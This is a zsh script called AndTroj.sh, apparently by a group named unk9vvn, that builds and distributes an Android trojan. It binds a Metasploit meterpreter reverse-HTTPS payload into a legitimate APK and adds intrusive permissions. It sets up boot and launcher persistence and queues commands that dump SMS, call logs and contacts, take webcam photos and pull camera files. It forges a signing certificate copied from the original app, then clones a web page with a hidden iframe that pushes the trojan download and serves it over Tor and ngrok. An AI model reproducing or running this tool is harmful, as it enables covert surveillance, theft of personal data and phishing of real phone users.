#!/bin/zsh
# v55
# ┌──(unk9vvn㉿avi)-[~]
# └─$ sudo chmod +x AndTroj.sh;sudo ./AndTroj.sh $NoIP $APK $URL



RED="\u001b[31m"
CYAN="\u001b[36m"
BLUE="\u001b[34m"
GREEN="\u001b[32m"
WHITE="\u001b[37m"
YELLOW="\u001b[33m"


TORRC=$(cat /etc/tor/torrc|grep -o "UseBridges 1")


if [ "$(id -u)" != "0" ];then
	echo -e "$RED [X]$YELLOW Please run as RooT ... $YELLOW"
	echo -e "$GREEN [*]$YELLOW sudo chmod +x AndTroj.sh;sudo ./AndTroj.sh $YELLOW"
	exit 0
fi


NoIP=$1
APK=$2
URL=$3
ORGAPK='/tmp/original'
PAYLOAD='/tmp/payload'
OUTPUT=`echo $APK | cut -d "." -f 1`
SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)



#-------------------------------OS Initial-------------------------------#


# Install Tools
if [[ ! -f "/usr/bin/jarsigner" || ! -f "/usr/bin/tor" || ! -f "/usr/bin/curl" || ! -f "/usr/local/bin/apktool" || ! -f "/usr/sbin/sendmail" || ! -f "/usr/bin/proxychains" || ! -f "/usr/bin/obfs4proxy" || ! -f "/usr/bin/msfvenom" ]];then
	echo -e "$GREEN [*]$YELLOW Install TOR $YELLOW"
	echo -e "$GREEN [*]$YELLOW Install AAPT $YELLOW"
	echo -e "$GREEN [*]$YELLOW Install CURL $YELLOW"
	echo -e "$GREEN [*]$YELLOW Install APKTool $YELLOW"
	echo -e "$GREEN [*]$YELLOW Install SendMail $YELLOW"
	echo -e "$GREEN [*]$YELLOW Install Obfs4Proxy $YELLOW"
	echo -e "$GREEN [*]$YELLOW Install Proxychains $YELLOW"
	echo -e "$GREEN [*]$YELLOW Install OpenJDK 11-14 $YELLOW"
	echo -e "$GREEN [*]$YELLOW Install Metasploit-Framework $YELLOW"
	apt-get -qq update;apt-get install -y -qq tor proxychains obfs4proxy curl aapt apktool default-jdk openjdk-11-jdk metasploit-framework sendemail apache2;msfdb init

	if [ "$(apktool -version)" != "2.6.0" ];then
		wget -q https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.6.0.jar -O /usr/local/bin/apktool.jar
		wget -q https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool
		chmod +x /usr/local/bin/apktool && chmod +x /usr/local/bin/apktool.jar
	fi
fi


# Config Tor
if [ "$TORRC" != "UseBridges 1" ]; then
	echo "
UseBridges 1
ClientTransportPlugin obfs4 exec /usr/bin/obfs4proxy managed

Bridge obfs4 194.135.89.28:443 7E3C52E04355F0D925B5F493BEFB97D419B70D80 cert=B+XjD3L80HvQLjm/Rw+D5RRSsCjlO0jW9WvA4NR7ADPE4zXyPpp5jN2RgeRDuIas1xG1PA iat-mode=0
Bridge obfs4 103.246.250.213:8042 30BBC628BAF0E1C6E5780A90B2954C9EF9A9792C cert=HUphhCSe3K+UQf1a4z7JB0jXpjIPQGEBIvyk2zwGoPMB/05qBrk8pY4CRSNfviRadyTyHQ iat-mode=0
Bridge obfs4 185.162.248.147:10111 7207F204CC4E242688FFA252599E51DDA776C01D cert=e3LSXtFXpmAP5pcW2UgSMwi4QaOeRiFxzXj6v9FXpD8yjjZhtcO2PDwBx+vdx4Wb5W3yTw iat-mode=0" >> /etc/tor/torrc
fi


# Install Ngrok
if ! test -f "/usr/local/bin/ngrok";then
	echo -e "$GREEN [*]$YELLOW Install Ngrok $YELLOW"
	curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null &&
    echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | tee /etc/apt/sources.list.d/ngrok.list &&
    apt update -qq && apt install -qq ngrok
    read -p "$GREEN [*]$YELLOW Enter Ngrok Token: $YELLOW" TOKEN
	ngrok $TOKEN
fi


function BANNER()
{
	clear
	echo -e "$GREEN" "                            --/osssssssssssso/--                    "
	echo -e "$GREEN" "                        -+sss+-+--os.yo:++/.o-/sss+-                "
	echo -e "$GREEN" "                     /sy+++-.h.-dd++m+om/s.h.hy/:+oys/              "
	echo -e "$GREEN" "                  .sy/// h/h-:d-y:/+-/+-+/-s/sodooh:///ys.          "
	echo -e "$GREEN" "                -ys-ss/:y:so-/osssso++++osssso+.oo+/s-:o.sy-        "
	echo -e "$GREEN" "              -ys:oossyo/+oyo/:-:.-:.:/.:/-.-:/syo/+/s+:oo:sy-      "
	echo -e "$GREEN" "             /d/:-soh/-+ho-.:::--:- .os: -:-.:-/::sy+:+ysso+:d/     "
	echo -e "$GREEN" "            sy-..+oo-+h:--:..hy+y/  :s+.  /y/sh..:/-:h+-oyss:.ys    "
	echo -e "$WHITE" "           ys :+oo/:d/   .m-yyyo/- - -:   .+oyhy-N.   /d::yosd.sy   "
	echo -e "$WHITE" "          oy.++++//d.  ::oNdyo:     .--.     :oyhN+-:  .d//s//y.ys  "
	echo -e "$WHITE" "         :m-y+++//d-   dyyy++::-. -.o.-+.- .-::/+hsyd   -d/so+++.m: "
	echo -e "$WHITE" "        -d/-/+++.m-  /.ohso- ://:///++++///://:  :odo.+  -m.syoo:/d-"
	echo -e "$WHITE" "        :m-+++y:y+   smyms-   -//+/-ohho-/+//-    omsmo   +y s+oy-m:"
	echo -e "$WHITE" "        sy:+++y-N-  -.dy+:...-- :: ./hh/. :: --...//hh.:  -N-o+/:-so"
	echo -e "$WHITE" "        yo-///s-m   odohd.-.--:/o.-+/::/+-.o/:--.--hd:ho   m-s+++-+y"
	echo -e "$WHITE" "        yo::/+o-m   -yNy/:  ...:+s.//:://.s+:...  :/yNs    m-h++++oy"
	echo -e "$WHITE" "        oy/hsss-N-  oo:oN-   .-o.:ss:--:ss:.o-.   -My-oo  -N-o+++.so"
	echo -e "$WHITE" "        :m :++y:y+   sNMy+: -+/:.--:////:--.:/+- -+hNNs   +y-o++o-m:"
	echo -e "$WHITE" "        -d/::+o+.m-  -:/+ho:.       -//-       ./sdo::-  -m-o++++/d-"
	echo -e "$WHITE" "         :m-yo++//d- -ommMo//        -:        +oyNhmo- -d//s+++-m: "
	echo -e "$WHITE" "          oy /o++//d.  -::/oMss-   -+++s     :yNy+/:   .d//y+---ys  "
	echo -e "$WHITE" "           ys--+o++:d/ -/sdmNysNs+/./-//-//hNyyNmmy+- /d-+y--::sy   "
	echo -e "$RED" "            sy:..ooo-+h/--.-//odm/hNh--yNh+Ndo//-./:/h+-so+:+/ys      "
	echo -e "$RED" "             /d-o.ssy+-+yo:/:/:-:+sho..ohs/-:://::oh+.h//syo-d/       "
	echo -e "$RED" "              -ys-oosyss:/oyy//::..-.--.--:/.//syo+-ys//o/.sy-        "
	echo -e "$RED" "                -ys.sooh+d-s:+osssysssosssssso:/+/h:/yy/.sy-          "
	echo -e "$RED" "                  .sy/:os.h--d/o+-/+:o:/+.+o:d-y+h-o+-+ys.            "
	echo -e "$RED" "                     :sy+:+ s//sy-y.-h-m/om:s-y.++/+ys/               "
	echo -e "$RED" "                        -+sss+/o/ s--y.s+/:++-+sss+-                  "
	echo -e "$RED" "                           --/osssssssssssso/--                       "
	echo -e "$BLUE" "                                  Unk9vvN                            "
	echo -e "$YELLOW" "                           https://unk9vvn.com                     "
	echo -e "$CYAN" "                                  AndTroj                            "
	echo -e "\n\n"
}


function join_by
{
	local d=${1-} f=${2-}; if shift 2; then printf %s "$f" "${@/#/$d}"; fi;
}


#-------------------------------APK Binder-------------------------------#


function BINDER()
{	
	for i in $(seq 1 7); do
		a[$i]=`cat /proc/sys/kernel/random/uuid | sed 's/[-]//g' | head -c 20; echo;`
	done

	RAND=(${a[@]})
	RAND_DIR=${RAND[1]}
	RAND_MAINBRAD=${RAND[2]}
	RAND_PAYLOAD=${RAND[3]}
	RAND_MainService=${RAND[4]}

	# Check Directorys
	if [ -d "$ORGAPK" ]; then
		rm -r $ORGAPK
	elif [ -d "$PAYLOAD" ]; then
		rm -r $PAYLOAD
	fi

	echo -e "$GREEN [*]$YELLOW Generate Metasploit APK: LHOST: $NoIP PORT:8443$YELLOW"
	service postgresql start
	msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST=$NoIP LPORT=8443 -o payload.apk
	BANNER
	echo -e "$GREEN [*]$YELLOW Generate Metasploit APK: LHOST: $NoIP PORT:443$YELLOW"
	echo -e "$GREEN [*]$YELLOW Decompile: payload.apk $WHITE"
	apktool -f d payload.apk -o $PAYLOAD > /dev/null
	rm payload.apk
	echo -e "$GREEN [*]$YELLOW Decompile: $APK $YELLOW"
	apktool -f d $APK -o $ORGAPK > /dev/null

	if [ ! -d "$ORGAPK/smali/com" ];then 
		mkdir "$ORGAPK/smali/com"
	fi


	# Change ANDROID API Version
	echo -e "$GREEN [*]$YELLOW Change Android API Version$WHITE"
	PACKAGE=`head -n 1 ${ORGAPK}/AndroidManifest.xml | sed -r 's/.*package="([^"]*)".*/\1/'`
	sed -i "1s#.*#<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?><manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"$PACKAGE\" platformBuildVersionCode=\"23\" platformBuildVersionName=\"6.0\">#" "${ORGAPK}/AndroidManifest.xml"


	# Set Permissions
	echo -e "$GREEN [*]$YELLOW Set Permissions$WHITE"
	permissions=(INTERNET ACCESS_WIFI_STATE CHANGE_WIFI_STATE ACCESS_NETWORK_STATE ACCESS_COARSE_LOCATION ACCESS_FINE_LOCATION READ_PHONE_STATE SEND_SMS RECEIVE_SMS RECORD_AUDIO CALL_PHONE READ_CONTACTS WRITE_CONTACTS RECORD_AUDIO WRITE_SETTINGS CAMERA READ_SMS WRITE_EXTERNAL_STORAGE RECEIVE_BOOT_COMPLETED SET_WALLPAPER READ_CALL_LOG WRITE_CALL_LOG WAKE_LOCK)

	for permission in "${permissions[@]}"; do 
		if ! grep -q "<uses-permission android:name=\"android.permission.$permission\"/>" "${ORGAPK}/AndroidManifest.xml"; then
			sed -i "/^<?xml.*/a \    <uses-permission android:name=\"android.permission.$permission\"/>" "${ORGAPK}/AndroidManifest.xml"
		fi
	done


	# Hooking Launchers
	echo -e "$GREEN [*]$YELLOW Hooking Launchers$WHITE"
	for line in $(seq 3 5);do
		line_num=`echo $(awk "/category.LAUNCHER/{ print NR - $line }" ${ORGAPK}/AndroidManifest.xml)`
		TAG=`sed -n "$line_num"p "${ORGAPK}/AndroidManifest.xml"`
		if [[ $TAG == *"android:name="* ]];then
			break
		fi
	done

	# Get Launcher PATH
	LAUNCHER=`echo $TAG | sed -r 's/.*android:name="([^"]*)".*/\1/'`
	LAUNCHER_PATH=`echo ${LAUNCHER%.*}`
	LAUNCHER_PATH=`echo ${LAUNCHER_PATH//.//}`
	LAUNCHER_FOLDERS=(${(@s:/:)LAUNCHER_PATH})
	
	# Get SMALI path
	SMALI_FOLDERS=(`ls $ORGAPK | grep smali`)
	for LAUNCHER_SMALI in $SMALI_FOLDERS;do
		if [ -f "$ORGAPK/$LAUNCHER_SMALI/${LAUNCHER//.//}.smali" ];then
			break
		fi
	done

	CUSTOM_FOLDER=""
	COUNTER=0
	for FOLDER in $LAUNCHER_FOLDERS;do
		if [ $COUNTER -eq 1 ];then
			CUSTOM_FOLDER="$FOLDER/"
		else
			CUSTOM_FOLDER="${CUSTOM_FOLDER}$FOLDER/"
		fi
		if [ ! -d "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER" ];then
			mkdir "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER"
		fi
		COUNTER=$[COUNTER + 1]
	done

	mkdir "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR"
	sed -i "s#</application>#    <receiver android:label=\"$RAND_MAINBRAD\" android:name=\"${LAUNCHER%.*}.$RAND_MAINBRAD\">\\n            <intent-filter>\\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\\n            </intent-filter>\\n        </receiver>\\n        <service android:exported=\"true\" android:name=\"${LAUNCHER%.*}.$RAND_MAINBRAD\"/>\\n    </application>#g" "${ORGAPK}/AndroidManifest.xml"


	# Clone Payload smali
	cd "$PAYLOAD/smali/com/metasploit/stage/"
	cp MainActivity.smali a.smali b.smali c.smali e.smali f.smali "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR"
	cp -r "$PAYLOAD/smali/com/metasploit/stage/Payload.smali" "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR/$RAND_PAYLOAD.smali"
	cp -r "$PAYLOAD/smali/com/metasploit/stage/MainService.smali" "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR/$RAND_MainService.smali"
	cp -r "$PAYLOAD/smali/com/metasploit/stage/MainBroadcastReceiver.smali" "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR/$RAND_MAINBRAD.smali"
	sed -i "s#metasploit/stage#$CUSTOM_FOLDER$RAND_DIR#g" "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR/"*
	sed -i "s#payload#$RAND_PAYLOAD#g" "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR/"*
	sed -i "s#MainService#$RAND_MainService#g" "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR/"*
	sed -i "s#MainBroadcastReceiver#$RAND_MAINBRAD#g" "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR/"*
	cd $SCRIPT_DIR


	# Second way to inject Launcher
	BACKUP=`cat $ORGAPK/AndroidManifest.xml | grep android:allowBackup | sed -r 's/.*android:name="([^"]*)".*/\1/'`
	BACKUP_PATH=`echo ${BACKUP%.*}`
	BACKUP_PATH=`echo ${BACKUP_PATH//.//}`


	# Get SMALI path
	SMALI_FOLDERS=(`ls $ORGAPK | grep smali`)
	for BACKUP_SMALI in $SMALI_FOLDERS;do
		if [ -f "$ORGAPK/$BACKUP_SMALI/${BACKUP//.//}.smali" ];then
			break
		fi
	done

	if [ ! -d "$ORGAPK/$BACKUP_SMALI/$BACKUP_PATH" ];then
		echo "in if: $ORGAPK/$BACKUP_SMALI/$BACKUP_PATH"
		sed -i "/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \n\ \ \ \ invoke-static \{p\}, Lcom/$RAND_PAYLOAD/$RAND_PAYLOAD/$RAND_MainService\;->start(Landroid\/content\/Context;)V" "$ORGAPK/$LAUNCHER_SMALI/${LAUNCHER%.*}.smali"
	else
		echo "in else"
		LAUNCHER_STARTER_NUM=`awk '/put-object/{ print NR }'  "$ORGAPK/$BACKUP_SMALI/${BACKUP//.//}.smali" | head -1`
		sed -i "$LAUNCHER_STARTER_NUM a \ \ \ \ invoke-static\ {v0},\ Lcom/$CUSTOM_FOLDER$RAND_DIR/$RAND_MainService;->start()V" "$ORGAPK/$BACKUP_SMALI/${BACKUP//.//}.smali"
	fi
	echo "#!/bin/bash
while true
do am start --user 0 -a android.intent.action.MAIN -n ${LAUNCHER%.*}/.MainActivity
sleep 600
done" > /tmp/persis.sh

	echo -e "$GREEN [*]$YELLOW Generate Persistent$WHITE"
	echo "upload /tmp/persis.sh
execute -f \"sh persis.sh\"
sysinfo
check_root
getwd
route
geolocate
screenshot
dump_calllog
dump_sms
dump_contacts
webcam_snap
cd ../../../../../
cd /sdcard/DCIM/Camera
download -r *" > /tmp/autoand.rc

	echo -e "$GREEN [*]$YELLOW Rebinding $OUTPUT $WHITE"
	apktool b $ORGAPK > /dev/null

	echo -e "$GREEN [*]$YELLOW Forged Signatures$WHITE"
	CERT=`keytool -J-Duser.language=en -printcert -jarfile $APK`
	CERT_OWNER=`echo $CERT | grep -o 'Owner: [^"]*'`
	CERT_COUNTRY=`echo $CERT | grep -o 'C=[^\"]*' | head -1`
	CERT_LOCALITY=`echo $CERT | grep -o 'L=[^\,]*' | head -1`
	CERT_ORGAN=`echo $CERT | grep -o 'O=[^\,]*' | head -1`
	CERT_ORGAN_UNIT=`echo $CERT | grep -o 'OU=[^\,]*' | head -1`
	CERT_COMMON_NAME=`echo $CERT | grep -o 'CN=[^\,]*' | head -1`
	CERT_EMAIL=`echo $CERT | grep -o 'EMAILADDRESS=[^\,]*' | head -1`
	CERT_STATE=`echo $CERT | grep -o 'ST=[^\,]*' | head -1`
	CERT_EST=`echo $CERT | grep -o 'EST [^\"]* u' | head -1 | cut -d " " -f 2`
	CERT_EDT=`echo $CERT | grep -o 'EDT [^\"]*' | head -1 | cut -d " " -f 2`
	CERT_VALID=`echo $CERT | grep -o 'Valid from: [^"]*'`
	CERT_LENGTH=`echo $CERT | grep -oh 'Subject Public Key Algorithm: [^"]*' |  sed -r 's/.*Algorithm: ([^ ]*)-.*/\1/'`	
	CERT_TYPE=`echo $CERT | grep -oh 'Subject Public Key Algorithm: [^"]*' |  sed -r 's/.*bit ([^ ]*) key.*/\1/'`
	CERT_SIG=`echo $CERT | grep -oh 'Signature algorithm name: [^"]*' |  sed -r 's/.*: ([^ ]*) .*/\1/'`
	CERT_DIGEST=`echo $CERT_SIG | sed -r 's/.*^([^w]*)with.*/\1/'`

	if [ -f "/tmp/unk9vvn.keystore" ];then
    	rm /tmp/unk9vvn.keystore
	fi

	DNAME_DATA=($CERT_COMMON_NAME $CERT_ORGAN_UNIT $CERT_ORGAN $CERT_LOCALITY $CERT_STATE $CERT_COUNTRY)
	DNAME=`join_by "," $DNAME_DATA`
	
	if [[ -z ${CERT_EST+z} ]];then
		keytool -genkey -alias signing.key -keystore /tmp/unk9vvn.keystore -storepass 12341234 -keypass 12341234 -keyalg $CERT_TYPE -keysize $CERT_LENGTH -startdate $CERT_EST/01/01 -validity $CERT_EDT -dname "$DNAME" > /dev/null
	else
		keytool -genkey -alias signing.key -keystore /tmp/unk9vvn.keystore -storepass 12341234 -keypass 12341234 -keyalg $CERT_TYPE -keysize $CERT_LENGTH -validity $CERT_EDT -dname "$DNAME" > /dev/null
	fi
	mv $ORGAPK/dist/$OUTPUT.apk "$SCRIPT_DIR/$OUTPUT-b.apk"
	jarsigner -verbose -sigalg $CERT_SIG -digestalg $CERT_DIGEST -keystore /tmp/unk9vvn.keystore "$OUTPUT-b.apk" signing.key -storepass 12341234 > /dev/null
	BANNER
	echo -e "$GREEN [*]$YELLOW Generate Metasploit APK: LHOST: $NoIP PORT:8443$YELLOW"
	echo -e "$GREEN [*]$YELLOW Decompile: payload.apk $WHITE"
	echo -e "$GREEN [*]$YELLOW Decompile: $APK $YELLOW"
	echo -e "$GREEN [*]$YELLOW Change Android API Version$WHITE"
	echo -e "$GREEN [*]$YELLOW Set Permissions$WHITE"
	echo -e "$GREEN [*]$YELLOW Hooking Launchers$WHITE"
	echo -e "$GREEN [*]$YELLOW Generate Persistent$WHITE"
	echo -e "$GREEN [*]$YELLOW Rebinding $OUTPUT $WHITE"
	echo -e "$GREEN [*]$YELLOW Forged Signatures$WHITE"
}


#-------------------------------Create Phising Page-------------------------------#


function PHISHING()
{
	echo -e "$GREEN [*]$YELLOW initialize Phishing Page$WHITE"
	service tor start;service apache2 start
	mv "$OUTPUT-b.apk" /var/www/html/
	wget -O /var/www/html/index.html -c -k -q -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "$URL"
	sed -i "s#</body>#<iframe id='frame' src='$OUTPUT-b.apk' application='yes' width=0 height=0 style='hidden' frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>\n<script type='text/javascript'>setTimeout(function(){window.location.href='$URL';}, 15000);</script>\n</body>#g" /var/www/html/index.html
	proxychains ngrok http 80
}



BANNER
BINDER
PHISHING
